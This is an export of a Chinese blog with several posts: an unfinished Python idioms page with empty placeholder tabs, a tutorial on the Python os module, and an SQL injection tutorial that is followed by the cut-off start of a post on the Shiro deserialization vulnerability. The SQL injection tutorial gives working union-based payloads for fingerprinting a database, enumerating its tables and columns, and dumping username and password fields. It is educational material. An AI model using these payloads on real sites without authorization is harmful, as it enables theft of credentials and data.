<h2 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    my_list.append(i*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [i*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="单行表达式"><a href="#单行表达式" class="headerlink" title="单行表达式"></a>单行表达式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3进阶</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python模块-OS</title>
    <url>//3953fa0e41bf.html</url>
    <content><![CDATA[<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><p>​        <code>OS</code>就是<code>operating system</code>的缩写，顾名思义，<code>OS</code>模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用<code>OS</code>模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性。如果该模块中相关功能出错，会抛出<code>OSError</code>异常或其子类异常。</p>
<h2 id="系统操作"><a href="#系统操作" class="headerlink" title="系统操作"></a>系统操作</h2><h3 id="os-sep"><a href="#os-sep" class="headerlink" title="os.sep"></a>os.sep</h3><p>输出系统路径的分隔符</p>
<p>Windows系统的是<code>\</code>，Linux系统的是<code>/</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">test = os.sep</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>



<h3 id="os-name"><a href="#os-name" class="headerlink" title="os.name"></a>os.name</h3><p>输出当前工作平台</p>
<p>Windows系统是<code>nt</code>，Linux/Unix系统是<code>posix</code>，Java虚拟环境为<code>java</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">test = os.name</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>



<h3 id="os-getenv"><a href="#os-getenv" class="headerlink" title="os.getenv()"></a>os.getenv()</h3><p>获取环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">test = os.getenv(<span class="string">&quot;path&quot;</span>)</span><br><span class="line">pprint(test)</span><br></pre></td></tr></table></figure>



<h3 id="os-getcwd"><a href="#os-getcwd" class="headerlink" title="os.getcwd()"></a>os.getcwd()</h3><p>获取当前路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">test = os.getcwd()</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>



<h3 id="os-environ"><a href="#os-environ" class="headerlink" title="os.environ"></a>os.environ</h3><p>返回环境信息，主要是各类的环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">test = os.environ</span><br><span class="line"><span class="built_in">print</span>(test)</span><br><span class="line">test1 = os.environ[<span class="string">&quot;APPDATA&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(test1)</span><br></pre></td></tr></table></figure>



<h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><h3 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir()"></a>os.listdir()</h3><p>返回指定路径下所有的目录和文件名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">test = os.getcwd()</span><br><span class="line"><span class="built_in">list</span> = os.listdir(test)</span><br><span class="line">pprint(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-walk"><a href="#os-walk" class="headerlink" title="os.walk()"></a>os.walk()</h3><p>通过遍历的方式返回指定路径下的所有目录和文件名，包括子目录</p>
<p>路径可以使用<code>.</code>，<code>..</code>，<code>路径名字</code>来指定</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.walk(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;文件夹1&quot;</span>,<span class="string">&quot;文件1&quot;</span>,<span class="string">&quot;文件2&quot;</span>)</span><br><span class="line">(<span class="string">&quot;.\\文件夹1&quot;</span>,<span class="string">&quot;文件3&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-mkdir"><a href="#os-mkdir" class="headerlink" title="os.mkdir()"></a>os.mkdir()</h3><p>创建一个文件夹</p>
<p>只能单独创建，不能逐级创建</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">os.mkdir(<span class="string">&quot;./log/123&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-rmdir"><a href="#os-rmdir" class="headerlink" title="os.rmdir()"></a>os.rmdir()</h3><p>删除一个空目录，目录中有文件则无法删除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.rmdir(<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs()"></a>os.makedirs()</h3><p>递归创建目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&quot;./log/123/456&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-removedirs"><a href="#os-removedirs" class="headerlink" title="os.removedirs()"></a>os.removedirs()</h3><p>递归删除空目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.removedirs(<span class="string">&quot;./log/123/456&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-chdir"><a href="#os-chdir" class="headerlink" title="os.chdir()"></a>os.chdir()</h3><p>更改当前目录为指定目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&quot;home&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="os-rename"><a href="#os-rename" class="headerlink" title="os.rename()"></a>os.rename()</h3><p>重命名指定文件夹或者文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.rename(<span class="string">&quot;old name&quot;</span>,<span class="string">&quot;new name&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="os-path"><a href="#os-path" class="headerlink" title="os.path"></a>os.path</h2><p><code>os.path</code>模块是对字符串进行处理，传入该模块函数的参数甚至不需要是一个有效路径，该模块也不会试图访问这个路径，而仅仅是按照“路径”的通用格式对字符串进行处理。</p>
<h3 id="os-path-join"><a href="#os-path-join" class="headerlink" title="os.path.join()"></a>os.path.join()</h3><p>用来组合路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.join(<span class="string">&quot;C:\\&quot;</span>,<span class="string">&quot;user&quot;</span>,<span class="string">&quot;desker&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"></span><br><span class="line">C:\user\desker</span><br></pre></td></tr></table></figure>



<h3 id="os-path-abspath"><a href="#os-path-abspath" class="headerlink" title="os.path.abspath()"></a>os.path.abspath()</h3><p>路径规范化</p>
<p>当输入的路径不规范时，会自动获取当前工作路径</p>
<p>并且使用<code>os.path.join()</code>函数组合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.abspath(<span class="string">&quot;C:/user/desker&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"></span><br><span class="line">C:\user\desker</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.abspath(<span class="string">&quot;user&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line">E:\文件夹\pytion\user</span><br></pre></td></tr></table></figure>



<h3 id="os-path-basename"><a href="#os-path-basename" class="headerlink" title="os.path.basename()"></a>os.path.basename()</h3><p>返回路径的最下级目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.basename(<span class="string">&quot;E:\\文件夹\\pytion\\456&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"></span><br><span class="line"><span class="number">456</span></span><br></pre></td></tr></table></figure>



<h3 id="os-path-dirname"><a href="#os-path-dirname" class="headerlink" title="os.path.dirname()"></a>os.path.dirname()</h3><p>返回最后一个分隔符之前的所有内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.dirname(<span class="string">&quot;E:\\文件夹\\pytion\\456&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"></span><br><span class="line">E:\文件夹\pytion</span><br></pre></td></tr></table></figure>



<h3 id="os-path-split"><a href="#os-path-split" class="headerlink" title="os.path.split()"></a>os.path.split()</h3><p>将路径以最后一个分隔符为界，分成两个字符串，并以元组的形式返回</p>
<p>前两个函数<code>os.path.dirname()</code>和<code>os.path.basename()</code>的返回值分别是函数<code>os.path.split()</code>返回值的第一个、第二个元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.split(<span class="string">&quot;E:\\文件夹\\pytion\\456&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(example[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">E:\文件夹\pytion</span><br><span class="line"><span class="number">456</span></span><br></pre></td></tr></table></figure>



<h3 id="os-path-exists"><a href="#os-path-exists" class="headerlink" title="os.path.exists()"></a>os.path.exists()</h3><p>判断目录路径或者文件是否存在</p>
<p>若存在则返回<code>True</code>，不存在则返回<code>False</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.exists(<span class="string">&quot;./456&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br></pre></td></tr></table></figure>



<h3 id="os-path-isabs"><a href="#os-path-isabs" class="headerlink" title="os.path.isabs()"></a>os.path.isabs()</h3><p>判断目标路径是否为绝对路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.isabs(<span class="string">&quot;c:/xxx/1.py&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br></pre></td></tr></table></figure>



<h3 id="os-path-isfile"><a href="#os-path-isfile" class="headerlink" title="os.path.isfile()"></a>os.path.isfile()</h3><p>判断目标是否为真实文件，会检验路径的有效性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.isfile(<span class="string">&quot;./1.py&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br></pre></td></tr></table></figure>



<h3 id="os-path-isdir"><a href="#os-path-isdir" class="headerlink" title="os.path.isdir()"></a>os.path.isdir()</h3><p>判断目标是否为真实路径，会检验路径的有效性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">example = os.path.isdir(<span class="string">&quot;./456&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python模块</category>
      </categories>
      <tags>
        <tag>Python模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Python模块-sys</title>
    <url>//53ecadd1c0fc.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python模块</category>
      </categories>
      <tags>
        <tag>Python模块</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入漏洞</title>
    <url>//9958bd672d7e.html</url>
    <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>一段MySQL查询数据为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where user_id = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>

<p>这一段代码的意思是，查询<code>user</code>表中<code>user_id</code>字段的值为1的所有数据</p>
<p>其中1是我们可以改变的地方，在不做任何防御措施下，我们将其改成我们构造的语句，从而造成SQL注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where user_id = &#x27;1&#x27; or 1 = 1 --+</span><br></pre></td></tr></table></figure>

<p>改变之后，这段代码的意思就变成了查询<code>user</code>表中<code>user_id</code>字段的值为1或者<code>1=1</code>的所有数据</p>
<p>由于<code>1=1</code>的结果为真，所以最后的结果就是查询<code>user</code>表中的所有数据</p>
<p>这里我们手动填写的语句就是<code>1&#39; or 1 = 1 --+</code></p>
<p>其中<code>1&#39;</code>闭合之前的语句，在通过<code>or 1 = 1</code>造成结果为真的判断</p>
<p>再通过注释符号<code>--</code>注释掉代码后边可能存在的其他语句，避免查询的结果与我们预期的结果不同</p>
<p>最后通过符号<code>+</code>来表示空格，避免注释符号<code>--</code>与之后的单引号连接导致出错，这样一段SQL注入就产生了</p>
<p><strong>在MySQL5.0以下</strong>，没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
<p><strong>在MySQL5.0以上</strong>，MySQL中默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
<p><strong>information_schema数据库中三个很重要的表：</strong></p>
<p><strong>information_schema.schemata</strong>:  该数据表存储了mysql数据库中的所有数据库的库名<br><strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中的所有数据表的表名<br><strong>information_schema.columns</strong>:    该数据表存储了mysql数据库中的所有列的列名</p>
<h3 id="SQL注入特征"><a href="#SQL注入特征" class="headerlink" title="SQL注入特征"></a>SQL注入特征</h3><p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
<li>database()：当前数据库</li>
<li>user()：查询数据库的用户</li>
<li>version()：查询数据库版本</li>
<li>system_user()：系统用户名</li>
<li>session_user()：链接数据库的用户名</li>
<li>current_user：当前用户名</li>
<li>load_file()：读取本地文件</li>
<li>@@datadir：读取数据库路径</li>
<li>@@basedir：MySQL安装路径</li>
<li>@@version_complie_os：查看操作系统</li>
</ul>
<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
<ul>
<li>数字类型的注入</li>
<li>字符类型的注入</li>
<li>搜索类型的注入</li>
</ul>
<p><strong>依据提交方式分类</strong></p>
<ul>
<li>GET注入</li>
<li>POST注入</li>
<li>COOKIE注入</li>
<li>HTTP头注入（XFF注入、UA注入、REFERER注入）</li>
</ul>
<p><strong>依据获取信息的方式分类</strong></p>
<ul>
<li>基于布尔的盲注</li>
<li>基于时间的盲注</li>
<li>基于报错的盲注</li>
<li>联合查询注入</li>
<li>堆查询注入（可同时执行多条语句）</li>
</ul>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">指纹</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MySQL</td>
<td align="center">information_schema.tables</td>
</tr>
<tr>
<td align="center">Access</td>
<td align="center">msysobjects</td>
</tr>
<tr>
<td align="center">SQL server</td>
<td align="center">sysobjects</td>
</tr>
<tr>
<td align="center">Oracle</td>
<td align="center">dual</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//判断MySQL数据库</span><br><span class="line">xxx?id=1 and exists(select * from information_schema.tables) --+</span><br><span class="line"> </span><br><span class="line">//判断Access数据库 </span><br><span class="line">xxx?id=1 and exists(select * from msysobjects) --+</span><br><span class="line"></span><br><span class="line">//判断Mssql数据库</span><br><span class="line">xxx?id=1 and exists(select * from sysobjects) --+</span><br><span class="line"> </span><br><span class="line">//判断Oracle数据库</span><br><span class="line">xxx?id=1 and (select count(*) from dual)&gt;0 --+</span><br></pre></td></tr></table></figure>



<h2 id="Union联合查询注入"><a href="#Union联合查询注入" class="headerlink" title="Union联合查询注入"></a>Union联合查询注入</h2><h3 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h3><p>当我们找到一个注入点时，首先判断该注入点中可能存在的闭合符号</p>
<p>无闭合，单引号<code>&#39;&#39;</code>,双引号<code>&quot;&quot;</code>,括号<code>()</code>,单引号+括号<code>(&#39;&#39;)</code>,双引号+括号<code>(&quot;&quot;)</code>….以及<code>引号+多括号</code>组合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1</span><br><span class="line">如果报错说明可能存在注入</span><br><span class="line"></span><br><span class="line">xxx?id = 1 and 1 = 2 --+</span><br><span class="line">如果不报错，说明不是数字型注入</span><br><span class="line"></span><br><span class="line">xxx?id = 1’ and 1 = 2 --+</span><br><span class="line">如果报错，说明闭合含有单引号，如果不报错，说明闭合含有双引号</span><br><span class="line">然后通过构造语句能否成功执行判断具体的闭合组合情况</span><br></pre></td></tr></table></figure>



<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = 1&#x27; order by 5 --+</span><br></pre></td></tr></table></figure>

<p>通过语句<code>order by x</code>来判断字段的数量</p>
<p>如果不报错，说明字段数量大于等于5，如果报错，说明字段数量小于5</p>
<h3 id="判断数据显示位置"><a href="#判断数据显示位置" class="headerlink" title="判断数据显示位置"></a>判断数据显示位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,2,3,4... --+ </span><br></pre></td></tr></table></figure>

<p>这里先通过负号<code>-</code>或者<code>and 1 = 2</code>使得数据库报错</p>
<p>再通过<code>union</code>建立联合查询，也就是在<code>select</code>查询里面再嵌套一个查询语句</p>
<p>后面的数值排列取决于判断的字段数量</p>
<p>若回显中出现了相应的数值说明我们接下来查询的信息会在该位置显示</p>
<p>如图下的2和3可能会在网页中显现出来</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxkgro2qj60o804iabv02.jpg" alt="SQL注入1.png"></p>
<h3 id="查询数据库库名"><a href="#查询数据库库名" class="headerlink" title="查询数据库库名"></a>查询数据库库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p><code>database()</code>是MySQL中的一个函数，表示当前数据库的名字</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxw3ux3yj60ps04ggnl02.jpg" alt="SQL注入2.png"></p>
<h3 id="枚举数据库中的所有的表"><a href="#枚举数据库中的所有的表" class="headerlink" title="枚举数据库中的所有的表"></a>枚举数据库中的所有的表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure>

<p>这个语句的意思是从<code>information_schema</code>的<code>table-schema</code>表中查找当前数据库的所有表</p>
<p><code>information_schema</code>：MySQL的默认数据库，包含了所有数据库，数据表的信息</p>
<p><code>table_schema</code>：默认数据库中的一个表，记录了数据库名字</p>
<p><code>table_name</code>：默认数据库中的一个表，记录了数据表的名字</p>
<p><code>group_concat()</code>：是MySQL的函数，把函数中字段的值输出在一行中，以逗号分隔</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyv8akyuj60xj04qgp102.jpg" alt="SQL注入3.png"></p>
<h3 id="枚举数据表中所有的字段"><a href="#枚举数据表中所有的字段" class="headerlink" title="枚举数据表中所有的字段"></a>枚举数据表中所有的字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = databese() and table_name = &#x27;user&#x27; --+</span><br></pre></td></tr></table></figure>

<p>这个语句的意思是从<code>information_schema</code>中条件为当前数据表并且当前数据库中的<code>user</code>表中所有字段的名字</p>
<p><code>column_name</code>：MySQL的默认数据库中的一个表，记录了字段的名字</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyvpxte8j60xg04qq6p02.jpg" alt="SQL注入4.png"></p>
<h3 id="查询字段中所有的值"><a href="#查询字段中所有的值" class="headerlink" title="查询字段中所有的值"></a>查询字段中所有的值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,group_concat(concat_ws(0x2d,username,password)),3 from user --+</span><br></pre></td></tr></table></figure>

<p>这个语句的意思是查询<code>user</code>表中<code>username</code>字段和<code>password</code>的值</p>
<p><code>concat_ws</code>：MySQL的函数，为了格式化数据，看起来整齐，通过第一个参数连接后面所有参数</p>
<p><code>0x2d</code>：ASCII码，代表<code>-</code></p>
<p>最后输出格式为<code>user1-pass1</code>,<code>user2-pass2</code>…..</p>
<h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><p>盲注，通常是在服务器没有回显错误信息，所以攻击者找到验证注入的SQL语句是否执行的方法</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro反序列化 - shiro 550 - CVE-2016-4437</title>
    <url>//3609c62142b6.html</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>​        Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
